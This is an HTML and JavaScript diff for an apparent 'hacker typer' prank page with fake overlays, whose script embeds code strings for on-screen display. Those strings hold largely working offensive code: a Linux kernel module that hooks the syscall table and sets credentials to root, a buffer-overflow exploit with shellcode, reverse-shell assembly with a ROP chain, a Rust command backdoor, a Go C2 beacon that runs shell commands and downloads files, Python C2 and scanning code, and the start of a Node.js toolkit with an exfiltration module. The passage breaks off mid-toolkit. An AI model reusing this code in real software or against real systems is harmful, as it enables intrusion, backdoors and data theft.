+<div id="app" style="display:none;">
+  <header id="top-bar">
+    <span><span class="status-dot"></span>HACKTERM v3.1 // SECURE SHELL</span>
+    <span id="clock">00:00:00.000</span>
+    <span id="theme-label">MATRIX</span>
+  </header>
+  <aside id="left-panel">
+    <div id="file-tree" class="panel">
+      <div class="panel-header">FILE SYSTEM</div>
+      <div id="file-tree-content"></div>
+    </div>
+    <div id="system-stats" class="panel">
+      <div class="panel-header">SYSTEM MONITOR</div>
+      <div id="stats-content">
+        <div class="stat-row"><span class="stat-label">CPU</span><div class="stat-bar-bg"><div class="stat-bar-fill" id="cpu-fill"></div></div><span class="stat-pct" id="cpu-pct">0%</span></div>
+        <div class="stat-row"><span class="stat-label">MEM</span><div class="stat-bar-bg"><div class="stat-bar-fill" id="mem-fill"></div></div><span class="stat-pct" id="mem-pct">0%</span></div>
+        <div class="stat-row"><span class="stat-label">NET</span><div class="stat-bar-bg"><div class="stat-bar-fill" id="net-fill"></div></div><span class="stat-pct" id="net-pct">0%</span></div>
+        <div class="stat-row"><span class="stat-label">DISK</span><div class="stat-bar-bg"><div class="stat-bar-fill" id="disk-fill"></div></div><span class="stat-pct" id="disk-pct">0%</span></div>
+      </div>
+    </div>
+  </aside>
+  <main id="terminal" class="panel">
+    <div class="panel-header">
+      <span>root@darknet:~/exploit</span>
+      <span style="color:var(--color-primary)">CONNECTED</span>
+    </div>
+    <div id="code-output"><div id="code-output-inner"></div><div id="code-output-spacer"></div></div>
+  </main>
+  <aside id="right-panel">
+    <div id="radar-panel" class="panel">
+      <div class="panel-header">NETWORK SCAN</div>
+      <canvas id="radar-canvas"></canvas>
+    </div>
+    <div id="log-panel" class="panel">
+      <div class="panel-header"><span>SYSTEM LOG</span><span id="log-count">0</span></div>
+      <div id="log-content"></div>
+    </div>
+  </aside>
+  <footer id="bottom-bar">
+    <span><span class="key">~</span> TERMINAL</span>
+    <span><span class="key">F1</span>-<span class="key">F4</span>,<span class="key">F6</span>-<span class="key">F9</span> EFFECTS</span>
+    <span><span class="key">F8</span> GLITCH</span>
+    <span><span class="key">TAB</span> AUTO</span>
+    <span><span class="key">SHIFT+P</span> PRANK</span>
+    <span><span class="key">ESC</span> SETTINGS</span>
+    <span><span class="key">1</span>-<span class="key">7</span> THEMES</span>
+    <span><span class="key">F11</span> FULLSCREEN</span>
+  </footer>
+</div>
+
+<!-- Overlays -->
+<div id="overlay-granted" class="overlay">ACCESS GRANTED<div class="overlay-sub">SECURITY CLEARANCE LEVEL 5</div></div>
+<div id="overlay-denied" class="overlay">ACCESS DENIED<div class="overlay-sub">UNAUTHORIZED ATTEMPT LOGGED</div></div>
+<div id="overlay-firewall" class="overlay"><canvas id="firewall-canvas"></canvas><div style="position:relative;z-index:2;">FIREWALL BYPASSED<div class="overlay-sub">REROUTING THROUGH PROXY NODES</div></div></div>
+<div id="overlay-download" class="overlay">
+  <div class="overlay-scroll-list" id="download-file-list"></div>
+  <div style="position:relative;z-index:2;">
+    DOWNLOADING FILES
+    <div id="download-bar-container"><div id="download-bar-fill"></div></div>
+    <div id="download-pct">0%</div>
+  </div>
+</div>
+<div id="overlay-trace" class="overlay">
+  <div class="overlay-scroll-list" id="trace-ip-list"></div>
+  <div style="position:relative;z-index:2;">
+    TRACING IP ADDRESS
+    <div id="trace-ip-display">0.0.0.0</div>
+  </div>
+  <div id="trace-graph-container"><canvas id="trace-graph-canvas"></canvas></div>
+</div>
+<div id="overlay-encrypt" class="overlay">
+  <div id="encrypt-stream"></div>
+  <div style="position:relative;z-index:2;">
+    ENCRYPTING DATA
+    <div id="encrypt-scramble"></div>
+  </div>
+</div>
+<div id="overlay-satellite" class="overlay interactive">
+  <canvas id="satellite-canvas"></canvas>
+  <div style="position:relative;z-index:2;">SATELLITE UPLINK<div class="sat-label" id="sat-label">SELECT A SATELLITE TO CONNECT</div></div>
+</div>
+
+<div id="overlay-nuke" class="overlay">NUCLEAR LAUNCH DETECTED<div id="nuke-countdown" class="overlay-sub">5</div></div>
+<div id="overlay-ddos" class="overlay">DDOS ATTACK INITIATED<div id="ddos-counter">0 CONNECTIONS</div><div id="ddos-bar-container"><div id="ddos-bar-fill"></div></div></div>
+<div id="overlay-rickroll" class="overlay">NEVER GONNA GIVE YOU UP</div>
+
+<!-- Settings Modal -->
+<div id="settings-modal" class="hidden">
+  <h2>// SETTINGS</h2>
+  <div class="setting-row"><label>SOUND</label><button class="toggle-btn active" id="btn-sound">ON</button></div>
+  <div class="setting-row"><label>CRT EFFECTS</label><button class="toggle-btn active" id="btn-crt">ON</button></div>
+  <div class="setting-row"><label>MATRIX RAIN</label><button class="toggle-btn active" id="btn-matrix">ON</button></div>
+  <div class="setting-row"><label>AUTO-TYPE SPEED</label><input type="range" id="autotype-speed" min="20" max="150" value="60"></div>
+</div>
+<!-- Terminal Popup -->
+<div id="terminal-popup" class="hidden">
+  <div id="terminal-popup-titlebar">
+    <span>TERMINAL // root@darknet</span>
+    <button id="terminal-popup-close">X</button>
+  </div>
+  <div id="terminal-popup-output"></div>
+  <div id="terminal-popup-input-line">
+    <span class="prompt-caret">root@darknet:~#</span>
+    <span id="prompt-input"></span><span class="prompt-cursor">_</span>
+  </div>
+</div>
+
+<!-- Pizza Overlay -->
+<div id="overlay-pizza" class="overlay"><div id="pizza-loading">LOADING PIZZA...</div><div class="pizza-spin" id="pizza-spinner">&#127829;</div></div>
+
+<!-- Crack Overlay -->
+<div id="crack-overlay"><svg id="crack-svg" viewBox="0 0 1920 1080" preserveAspectRatio="none"></svg></div>
+
+<!-- Prank Mode -->
+<div id="prank-overlay">
+  <div id="prank-desktop">
+    <div class="prank-icon" style="position:absolute;top:20px;left:20px;">
+      <div class="prank-icon-img">&#128187;</div>
+      <div class="prank-icon-label">My Computer</div>
+    </div>
+    <div class="prank-icon" style="position:absolute;top:120px;left:20px;">
+      <div class="prank-icon-img">&#128452;</div>
+      <div class="prank-icon-label">Recycle Bin</div>
+    </div>
+    <div class="prank-icon" style="position:absolute;top:220px;left:20px;">
+      <div class="prank-icon-img">&#128196;</div>
+      <div class="prank-icon-label">report_final_v2.docx</div>
+    </div>
+    <div class="prank-icon" style="position:absolute;top:320px;left:20px;">
+      <div class="prank-icon-img">&#128193;</div>
+      <div class="prank-icon-label">New Folder</div>
+    </div>
+    <div class="prank-icon" style="position:absolute;top:20px;left:120px;">
+      <div class="prank-icon-img">&#127760;</div>
+      <div class="prank-icon-label">Internet Explorer</div>
+    </div>
+    <div class="prank-icon" style="position:absolute;top:120px;left:120px;">
+      <div class="prank-icon-img">&#128231;</div>
+      <div class="prank-icon-label">Outlook</div>
+    </div>
+  </div>
+  <div id="prank-taskbar">
+    <div style="display:flex;align-items:center;gap:8px;">
+      <div id="prank-start-btn">&#9776; Start</div>
+    </div>
+    <div id="prank-tray">
+      <span>&#128266;</span>
+      <span>&#128246;</span>
+      <span id="prank-clock"></span>
+    </div>
+  </div>
+</div>
+
+<div id="fs-prompt">PRESS F11 FOR FULLSCREEN // TYPE ANYTHING TO BEGIN</div>
+
+<script>
+(function() {
+'use strict';
+
+const CODE_SOURCES = [
+`#include <linux/sched.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+
+static unsigned long **sys_call_table;
+static int exploit_initialized = 0;
+
+typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
+static sys_call_ptr_t original_read;
+
+struct exploit_config {
+    unsigned long target_addr;
+    unsigned int payload_size;
+    char shellcode[256];
+    int privilege_level;
+    struct list_head node;
+    spinlock_t lock;
+};
+
+static struct exploit_config *global_config = NULL;
+
+static unsigned long **find_sys_call_table(void) {
+    unsigned long int offset = PAGE_OFFSET;
+    unsigned long **sct;
+    while (offset < ULLONG_MAX) {
+        sct = (unsigned long **)offset;
+        if (sct[__NR_close] == (unsigned long *)ksys_close) {
+            printk(KERN_INFO "[exploit] sys_call_table found at %px\\n", sct);
+            return sct;
+        }
+        offset += sizeof(void *);
+    }
+    return NULL;
+}
+
+static void escalate_privileges(void) {
+    struct cred *new_cred;
+    new_cred = prepare_creds();
+    if (new_cred == NULL) {
+        printk(KERN_ERR "[exploit] Failed to prepare credentials\\n");
+        return;
+    }
+    new_cred->uid.val = new_cred->gid.val = 0;
+    new_cred->euid.val = new_cred->egid.val = 0;
+    new_cred->suid.val = new_cred->sgid.val = 0;
+    new_cred->fsuid.val = new_cred->fsgid.val = 0;
+    commit_creds(new_cred);
+    printk(KERN_INFO "[exploit] Privileges escalated to root\\n");
+}
+
+asmlinkage long hooked_read(const struct pt_regs *regs) {
+    long ret = original_read(regs);
+    if (ret > 0 && current->cred->uid.val == 0) {
+        struct exploit_config *cfg;
+        spin_lock(&global_config->lock);
+        cfg = global_config;
+        if (cfg->privilege_level >= 4) {
+            memcpy((void *)cfg->target_addr, cfg->shellcode, cfg->payload_size);
+            cfg->privilege_level = 5;
+        }
+        spin_unlock(&global_config->lock);
+    }
+    return ret;
+}
+
+static int __init exploit_init(void) {
+    printk(KERN_INFO "[exploit] Module loading...\\n");
+    sys_call_table = find_sys_call_table();
+    if (!sys_call_table) {
+        printk(KERN_ERR "[exploit] Could not find sys_call_table\\n");
+        return -1;
+    }
+    global_config = kmalloc(sizeof(struct exploit_config), GFP_KERNEL);
+    if (!global_config) return -ENOMEM;
+    memset(global_config, 0, sizeof(struct exploit_config));
+    spin_lock_init(&global_config->lock);
+    global_config->privilege_level = 1;
+    original_read = (sys_call_ptr_t)sys_call_table[__NR_read];
+    write_cr0(read_cr0() & (~0x10000));
+    sys_call_table[__NR_read] = (unsigned long *)hooked_read;
+    write_cr0(read_cr0() | 0x10000);
+    exploit_initialized = 1;
+    escalate_privileges();
+    printk(KERN_INFO "[exploit] Module loaded successfully\\n");
+    return 0;
+}
+
+module_init(exploit_init);
+MODULE_LICENSE("GPL");
+`,
+`#include <stdint.h>
+#include <string.h>
+
+#define AES_BLOCK_SIZE 16
+#define AES_KEY_SIZE 32
+#define AES_ROUNDS 14
+
+static const uint8_t sbox[256] = {
+    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
+    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
+    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
+    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0
+};
+
+typedef struct {
+    uint32_t round_key[60];
+    uint8_t iv[AES_BLOCK_SIZE];
+    int key_length;
+    int num_rounds;
+} aes_ctx_t;
+
+static uint32_t sub_word(uint32_t word) {
+    return (sbox[(word >> 24) & 0xFF] << 24) |
+           (sbox[(word >> 16) & 0xFF] << 16) |
+           (sbox[(word >> 8) & 0xFF] << 8) |
+           (sbox[word & 0xFF]);
+}
+
+void aes_key_expansion(aes_ctx_t *ctx, const uint8_t *key) {
+    uint32_t temp;
+    int i;
+    int nk = ctx->key_length / 4;
+    for (i = 0; i < nk; i++) {
+        ctx->round_key[i] = (key[4*i] << 24) | (key[4*i+1] << 16) |
+                            (key[4*i+2] << 8) | key[4*i+3];
+    }
+    for (i = nk; i < 4 * (ctx->num_rounds + 1); i++) {
+        temp = ctx->round_key[i - 1];
+        if (i % nk == 0) {
+            temp = sub_word(temp) ^ (0x01 << 24);
+        }
+        ctx->round_key[i] = ctx->round_key[i - nk] ^ temp;
+    }
+}
+
+static void sub_bytes(uint8_t state[4][4]) {
+    for (int i = 0; i < 4; i++)
+        for (int j = 0; j < 4; j++)
+            state[i][j] = sbox[state[i][j]];
+}
+
+static uint8_t gmul(uint8_t a, uint8_t b) {
+    uint8_t p = 0;
+    for (int i = 0; i < 8; i++) {
+        if (b & 1) p ^= a;
+        uint8_t hi = a & 0x80;
+        a <<= 1;
+        if (hi) a ^= 0x1B;
+        b >>= 1;
+    }
+    return p;
+}
+
+static void mix_columns(uint8_t state[4][4]) {
+    for (int c = 0; c < 4; c++) {
+        uint8_t a[4];
+        memcpy(a, &state[0][c], 4);
+        state[0][c] = gmul(a[0],2) ^ gmul(a[1],3) ^ a[2] ^ a[3];
+        state[1][c] = a[0] ^ gmul(a[1],2) ^ gmul(a[2],3) ^ a[3];
+        state[2][c] = a[0] ^ a[1] ^ gmul(a[2],2) ^ gmul(a[3],3);
+        state[3][c] = gmul(a[0],3) ^ a[1] ^ a[2] ^ gmul(a[3],2);
+    }
+}
+
+void aes_encrypt_block(aes_ctx_t *ctx, const uint8_t *in, uint8_t *out) {
+    uint8_t state[4][4];
+    for (int i = 0; i < 4; i++)
+        for (int j = 0; j < 4; j++)
+            state[j][i] = in[i * 4 + j];
+    for (int round = 1; round < ctx->num_rounds; round++) {
+        sub_bytes(state);
+        mix_columns(state);
+    }
+    for (int i = 0; i < 4; i++)
+        for (int j = 0; j < 4; j++)
+            out[i * 4 + j] = state[j][i];
+}
+
+int aes_cbc_encrypt(aes_ctx_t *ctx, uint8_t *data, size_t len) {
+    if (len % AES_BLOCK_SIZE != 0) return -1;
+    uint8_t *iv = ctx->iv;
+    for (size_t offset = 0; offset < len; offset += AES_BLOCK_SIZE) {
+        for (int i = 0; i < AES_BLOCK_SIZE; i++)
+            data[offset + i] ^= iv[i];
+        aes_encrypt_block(ctx, data + offset, data + offset);
+        iv = data + offset;
+    }
+    memcpy(ctx->iv, iv, AES_BLOCK_SIZE);
+    return 0;
+}
+`,
+`#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#define TARGET_PORT 4444
+#define BUFFER_SIZE 1024
+#define NOP_SLED_SIZE 128
+
+unsigned char shellcode[] =
+    "\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89"
+    "\\xc6\\x48\\x8d\\x3d\\x04\\x00\\x00\\x00"
+    "\\xeb\\x0e\\x5e\\x48\\x31\\xc0\\x50\\x48"
+    "\\x89\\xe2\\x48\\x89\\xe6\\xb0\\x3b\\x0f"
+    "\\x05\\xe8\\xed\\xff\\xff\\xff\\x2f\\x62"
+    "\\x69\\x6e\\x2f\\x73\\x68\\x00\\x48\\x89";
+
+struct target_info {
+    char ip_addr[16];
+    int port;
+    int socket_fd;
+    unsigned long ret_addr;
+    int offset;
+    int connected;
+};
+
+int create_payload(char *buffer, int buf_size, struct target_info *target) {
+    memset(buffer, 0, buf_size);
+    memset(buffer, 0x90, NOP_SLED_SIZE);
+    memcpy(buffer + NOP_SLED_SIZE, shellcode, sizeof(shellcode) - 1);
+    int payload_end = NOP_SLED_SIZE + sizeof(shellcode) - 1;
+    memset(buffer + payload_end, 'A', target->offset - payload_end);
+    unsigned long *ret_ptr = (unsigned long *)(buffer + target->offset);
+    *ret_ptr = target->ret_addr;
+    printf("[*] Payload constructed: %d bytes\\n", target->offset + 8);
+    return target->offset + 8;
+}
+
+int establish_connection(struct target_info *target) {
+    struct sockaddr_in server_addr;
+    target->socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (target->socket_fd < 0) return -1;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(target->port);
+    inet_pton(AF_INET, target->ip_addr, &server_addr.sin_addr);
+    if (connect(target->socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) return -1;
+    target->connected = 1;
+    return 0;
+}
+
+int send_exploit(struct target_info *target) {
+    char payload[BUFFER_SIZE];
+    int payload_size = create_payload(payload, BUFFER_SIZE, target);
+    int bytes_sent = send(target->socket_fd, payload, payload_size, 0);
+    if (bytes_sent < 0) return -1;
+    printf("[+] Payload sent: %d bytes\\n", bytes_sent);
+    char response[256];
+    int bytes_recv = recv(target->socket_fd, response, sizeof(response) - 1, 0);
+    if (bytes_recv > 0) {
+        response[bytes_recv] = '\\0';
+        printf("[+] Shell obtained!\\n");
+        return 0;
+    }
+    return -1;
+}
+
+int main(int argc, char *argv[]) {
+    struct target_info target;
+    memset(&target, 0, sizeof(target));
+    strncpy(target.ip_addr, "192.168.1.100", sizeof(target.ip_addr));
+    target.port = TARGET_PORT;
+    target.ret_addr = 0x7fffffffe340;
+    target.offset = 264;
+    printf("[*] Buffer Overflow Exploit v2.1\\n");
+    if (establish_connection(&target) != 0) return 1;
+    if (send_exploit(&target) != 0) return 1;
+    printf("[+] Exploit successful!\\n");
+    return 0;
+}
+`,
+`#!/usr/bin/env python3
+import socket
+import hashlib
+import threading
+import struct
+import ssl
+import os
+import sys
+import time
+
+class PayloadGenerator:
+    def __init__(self, target_arch="x86_64"):
+        self.arch = target_arch
+        self.encoder = XOREncoder()
+
+    def generate(self, lhost, lport, encoding_rounds=3):
+        raw_payload = self._create_stager(lhost, lport)
+        encoded = self.encoder.encode(raw_payload, rounds=encoding_rounds)
+        return self._add_decoder_stub(encoded)
+
+    def _create_stager(self, lhost, lport):
+        ip_bytes = socket.inet_aton(lhost)
+        port_bytes = struct.pack(">H", lport)
+        return ip_bytes + port_bytes
+
+    def _add_decoder_stub(self, payload):
+        stub = b"\\x48\\x31\\xc9\\x48\\x81\\xe9"
+        return stub + payload
+
+class XOREncoder:
+    def __init__(self):
+        self.key = os.urandom(16)
+
+    def encode(self, data, rounds=1):
+        result = data
+        for _ in range(rounds):
+            output = bytearray()
+            for i, byte in enumerate(data):
+                output.append(byte ^ self.key[i % len(self.key)])
+            result = bytes(output)
+        return result
+
+class NetworkScanner:
+    def __init__(self, target_range, port_range=(1, 1024)):
+        self.target_range = target_range
+        self.port_start, self.port_end = port_range
+        self.results = {}
+        self.lock = threading.Lock()
+
+    def scan_host(self, host):
+        open_ports = []
+        for port in range(self.port_start, self.port_end + 1):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                result = sock.connect_ex((host, port))
+                if result == 0:
+                    service = self._identify_service(port)
+                    open_ports.append({"port": port, "service": service})
+                    print(f"  [+] {host}:{port} OPEN ({service})")
+                sock.close()
+            except Exception:
+                pass
+        with self.lock:
+            self.results[host] = open_ports
+
+    def _identify_service(self, port):
+        services = {22: "SSH", 80: "HTTP", 443: "HTTPS", 21: "FTP", 25: "SMTP", 3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP-ALT"}
+        return services.get(port, "UNKNOWN")
+
+    def scan_range(self, threads=50):
+        print(f"[*] Scanning {self.target_range}")
+        base = self.target_range.rsplit(".", 1)[0]
+        hosts = [f"{base}.{i}" for i in range(1, 255)]
+        pool = []
+        for host in hosts:
+            t = threading.Thread(target=self.scan_host, args=(host,))
+            pool.append(t)
+            t.start()
+            if len(pool) >= threads:
+                for t in pool: t.join()
+                pool = []
+        for t in pool: t.join()
+        return self.results
+
+class EncryptedC2Channel:
+    def __init__(self, server_addr, server_port):
+        self.addr = server_addr
+        self.port = server_port
+        self.key = hashlib.sha256(b"c2_master_key").digest()
+        self.iv = os.urandom(16)
+
+    def connect(self):
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket = ctx.wrap_socket(raw_sock)
+        self.socket.connect((self.addr, self.port))
+        self._handshake()
+
+    def _handshake(self):
+        nonce = os.urandom(32)
+        self.socket.send(nonce)
+        challenge = self.socket.recv(64)
+        response = hashlib.sha512(nonce + challenge + self.key).digest()
+        self.socket.send(response)
+
+if __name__ == "__main__":
+    scanner = NetworkScanner("10.0.0.0/24", port_range=(1, 65535))
+    results = scanner.scan_range(threads=100)
+    for host, ports in results.items():
+        if ports:
+            print(f"\\n[+] {host}: {len(ports)} open ports")
+`,
+`section .text
+global _start
+
+_start:
+    xor     rax, rax
+    xor     rdi, rdi
+    xor     rsi, rsi
+    xor     rdx, rdx
+
+create_socket:
+    push    0x29
+    pop     rax
+    push    0x02
+    pop     rdi
+    push    0x01
+    pop     rsi
+    xor     rdx, rdx
+    syscall
+    mov     r12, rax
+
+connect_back:
+    mov     rdi, r12
+    xor     rax, rax
+    push    rax
+    mov     dword [rsp-4], 0x0100007F
+    mov     word  [rsp-6], 0x5C11
+    mov     word  [rsp-8], 0x0002
+    sub     rsp, 8
+    mov     rsi, rsp
+    push    0x10
+    pop     rdx
+    push    0x2A
+    pop     rax
+    syscall
+    test    rax, rax
+    js      exit_fail
+
+redirect_io:
+    mov     rdi, r12
+    xor     rsi, rsi
+.dup_loop:
+    push    0x21
+    pop     rax
+    syscall
+    inc     rsi
+    cmp     rsi, 0x03
+    jne     .dup_loop
+
+spawn_shell:
+    xor     rax, rax
+    push    rax
+    mov     rbx, 0x68732f6e69622f
+    push    rbx
+    mov     rdi, rsp
+    xor     rsi, rsi
+    xor     rdx, rdx
+    push    0x3B
+    pop     rax
+    syscall
+
+exit_fail:
+    push    0x3C
+    pop     rax
+    xor     rdi, rdi
+    syscall
+
+build_rop_chain:
+    mov     rax, [rbp-0x08]
+    add     rax, 0x000439c8
+    mov     [rsp], rax
+    mov     rax, [rbp-0x08]
+    add     rax, 0x001b3e1a
+    mov     [rsp+0x08], rax
+    mov     rax, [rbp-0x08]
+    add     rax, 0x00043ec8
+    mov     [rsp+0x10], rax
+    xor     rbx, rbx
+    mov     [rsp+0x18], rbx
+    mov     rax, [rbp-0x08]
+    add     rax, 0x000d2975
+    mov     [rsp+0x38], rax
+    leave
+    ret
+
+stack_pivot:
+    xchg    rsp, rax
+    ret
+`,
+// Rust - network backdoor
+`use std::net::{TcpStream, TcpListener};
+use std::io::{Read, Write, BufReader, BufRead};
+use std::process::Command;
+use std::thread;
+use std::sync::{Arc, Mutex};
+use std::collections::HashMap;
+
+const BIND_ADDR: &str = "0.0.0.0:4444";
+const MAX_CLIENTS: usize = 64;
+const BUFFER_SIZE: usize = 4096;
+
+struct ClientSession {
+    stream: TcpStream,
+    addr: String,
+    authenticated: bool,
+    privilege_level: u8,
+}
+
+impl ClientSession {
+    fn new(stream: TcpStream, addr: String) -> Self {
+        ClientSession {
+            stream,
+            addr,
+            authenticated: false,
+            privilege_level: 0,
+        }
+    }
+
+    fn authenticate(&mut self, token: &[u8]) -> bool {
+        let hash = blake3::hash(token);
+        let expected = blake3::hash(b"backdoor_master_key_2024");
+        if hash == expected {
+            self.authenticated = true;
+            self.privilege_level = 255;
+            true
+        } else {
+            false
+        }
+    }
+
+    fn execute_command(&self, cmd: &str) -> Result<String, String> {
+        if !self.authenticated {
+            return Err("Not authenticated".to_string());
+        }
+        let output = Command::new("sh")
+            .arg("-c")
+            .arg(cmd)
+            .output()
+            .map_err(|e| e.to_string())?;
+        Ok(String::from_utf8_lossy(&output.stdout).to_string())
+    }
+}
+
+fn handle_client(mut session: ClientSession, clients: Arc<Mutex<HashMap<String, ClientSession>>>) {
+    let mut buffer = [0u8; BUFFER_SIZE];
+    println!("[+] New connection from {}", session.addr);
+    loop {
+        match session.stream.read(&mut buffer) {
+            Ok(0) => break,
+            Ok(n) => {
+                let data = &buffer[..n];
+                if !session.authenticated {
+                    if session.authenticate(data) {
+                        let _ = session.stream.write(b"AUTH_OK\\n");
+                    } else {
+                        let _ = session.stream.write(b"AUTH_FAIL\\n");
+                    }
+                } else {
+                    let cmd = String::from_utf8_lossy(data).trim().to_string();
+                    match session.execute_command(&cmd) {
+                        Ok(output) => { let _ = session.stream.write(output.as_bytes()); }
+                        Err(e) => { let _ = session.stream.write(format!("ERROR: {}\\n", e).as_bytes()); }
+                    }
+                }
+            }
+            Err(_) => break,
+        }
+    }
+    println!("[-] Client {} disconnected", session.addr);
+}
+
+fn main() {
+    let listener = TcpListener::bind(BIND_ADDR).expect("Failed to bind");
+    println!("[*] Backdoor listening on {}", BIND_ADDR);
+    let clients: Arc<Mutex<HashMap<String, ClientSession>>> = Arc::new(Mutex::new(HashMap::new()));
+    for stream in listener.incoming() {
+        match stream {
+            Ok(stream) => {
+                let addr = stream.peer_addr().unwrap().to_string();
+                let session = ClientSession::new(stream, addr.clone());
+                let clients_clone = Arc::clone(&clients);
+                thread::spawn(move || handle_client(session, clients_clone));
+            }
+            Err(e) => eprintln!("[-] Accept error: {}", e),
+        }
+    }
+}
+`,
+// Go - C2 beacon
+`package main
+
+import (
+    "crypto/aes"
+    "crypto/cipher"
+    "crypto/rand"
+    "crypto/sha256"
+    "encoding/hex"
+    "fmt"
+    "io"
+    "net"
+    "net/http"
+    "os/exec"
+    "runtime"
+    "strings"
+    "sync"
+    "time"
+)
+
+const (
+    C2Server    = "10.0.0.1:8443"
+    BeaconInterval = 30 * time.Second
+    MaxRetries  = 5
+    EncryptionKey = "c2_aes_256_key_deadbeef_2024"
+)
+
+type Beacon struct {
+    ID        string
+    Hostname  string
+    OS        string
+    Arch      string
+    Connected bool
+    mu        sync.Mutex
+    conn      net.Conn
+    cipher    cipher.AEAD
+}
+
+func NewBeacon() *Beacon {
+    hostname, _ := exec.Command("hostname").Output()
+    key := sha256.Sum256([]byte(EncryptionKey))
+    block, _ := aes.NewCipher(key[:])
+    gcm, _ := cipher.NewGCM(block)
+    return &Beacon{
+        ID:       generateID(),
+        Hostname: strings.TrimSpace(string(hostname)),
+        OS:       runtime.GOOS,
+        Arch:     runtime.GOARCH,
+        cipher:   gcm,
+    }
+}
+
+func generateID() string {
+    b := make([]byte, 16)
+    rand.Read(b)
+    return hex.EncodeToString(b)
+}
+
+func (b *Beacon) Encrypt(plaintext []byte) ([]byte, error) {
+    nonce := make([]byte, b.cipher.NonceSize())
+    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+        return nil, err
+    }
+    return b.cipher.Seal(nonce, nonce, plaintext, nil), nil
+}
+
+func (b *Beacon) Decrypt(ciphertext []byte) ([]byte, error) {
+    nonceSize := b.cipher.NonceSize()
+    if len(ciphertext) < nonceSize {
+        return nil, fmt.Errorf("ciphertext too short")
+    }
+    nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
+    return b.cipher.Open(nil, nonce, ct, nil)
+}
+
+func (b *Beacon) Connect() error {
+    b.mu.Lock()
+    defer b.mu.Unlock()
+    var err error
+    for i := 0; i < MaxRetries; i++ {
+        b.conn, err = net.DialTimeout("tcp", C2Server, 10*time.Second)
+        if err == nil {
+            b.Connected = true
+            fmt.Printf("[+] Connected to C2: %s\\n", C2Server)
+            registration := fmt.Sprintf("REGISTER|%s|%s|%s|%s", b.ID, b.Hostname, b.OS, b.Arch)
+            encrypted, _ := b.Encrypt([]byte(registration))
+            b.conn.Write(encrypted)
+            return nil
+        }
+        fmt.Printf("[-] Connection attempt %d failed: %v\\n", i+1, err)
+        time.Sleep(time.Duration(i+1) * 5 * time.Second)
+    }
+    return fmt.Errorf("failed to connect after %d retries", MaxRetries)
+}
+
+func (b *Beacon) ExecuteTask(task string) string {
+    parts := strings.SplitN(task, " ", 2)
+    switch parts[0] {
+    case "EXEC":
+        if len(parts) < 2 { return "ERROR: no command" }
+        out, err := exec.Command("sh", "-c", parts[1]).CombinedOutput()
+        if err != nil { return fmt.Sprintf("ERROR: %v\\n%s", err, out) }
+        return string(out)
+    case "DOWNLOAD":
+        resp, err := http.Get(parts[1])
+        if err != nil { return fmt.Sprintf("ERROR: %v", err) }
+        defer resp.Body.Close()
+        return fmt.Sprintf("Downloaded %d bytes", resp.ContentLength)
+    case "SLEEP":
+        return "ACK"
+    default:
+        return "UNKNOWN_TASK"
+    }
+}
+
+func main() {
+    beacon := NewBeacon()
+    fmt.Printf("[*] Beacon ID: %s\\n", beacon.ID)
+    fmt.Printf("[*] Host: %s (%s/%s)\\n", beacon.Hostname, beacon.OS, beacon.Arch)
+    if err := beacon.Connect(); err != nil {
+        fmt.Printf("[-] Fatal: %v\\n", err)
+        return
+    }
+    ticker := time.NewTicker(BeaconInterval)
+    for range ticker.C {
+        fmt.Println("[*] Beacon pulse...")
+    }
+}
+`,
+// JavaScript - Node.js exploit toolkit
+`const crypto = require('crypto');
+const net = require('net');
+const http = require('http');
+const { execSync, spawn } = require('child_process');
+const fs = require('fs');
+const os = require('os');
+
+const CONFIG = {
+  c2Host: '10.0.0.1',
+  c2Port: 9443,
+  encryptionKey: crypto.scryptSync('exploit_master_key', 'salt_2024', 32),
+  beaconInterval: 30000,
+  maxPayloadSize: 1024 * 1024,
+};
+
+class ExploitFramework {
+  constructor() {
+    this.modules = new Map();
+    this.sessions = new Map();
+    this.iv = crypto.randomBytes(16);
+    this.registerDefaultModules();
+  }
+
+  encrypt(data) {
+    const iv = crypto.randomBytes(16);
+    const cipher = crypto.createCipheriv('aes-256-gcm', CONFIG.encryptionKey, iv);
+    const encrypted = Buffer.concat([cipher.update(data, 'utf8'), cipher.final()]);
+    const tag = cipher.getAuthTag();
+    return Buffer.concat([iv, tag, encrypted]);
+  }
+
+  decrypt(buffer) {
+    const iv = buffer.slice(0, 16);
+    const tag = buffer.slice(16, 32);
+    const data = buffer.slice(32);
+    const decipher = crypto.createDecipheriv('aes-256-gcm', CONFIG.encryptionKey, iv);
+    decipher.setAuthTag(tag);
+    return decipher.update(data) + decipher.final('utf8');
+  }
+
+  registerDefaultModules() {
+    this.modules.set('portscan', {
+      name: 'TCP Port Scanner',
+      execute: async (target, portRange) => {
+        const [start, end] = portRange.split('-').map(Number);
+        const results = [];
+        const promises = [];
+        for (let port = start; port <= end; port++) {
+          promises.push(this.scanPort(target, port).then(open => {
+            if (open) results.push(port);
+          }));
+          if (promises.length >= 100) {
+            await Promise.all(promises);
+            promises.length = 0;
+          }
+        }
+        await Promise.all(promises);
+        return results.sort((a, b) => a - b);
+      }
+    });
+
+    this.modules.set('exfiltrate', {
+      name: 'Data Exfiltration',
+      execute: async (targetDir) => {
+        const files = fs.readdirSync(targetDir, { recursive: true });
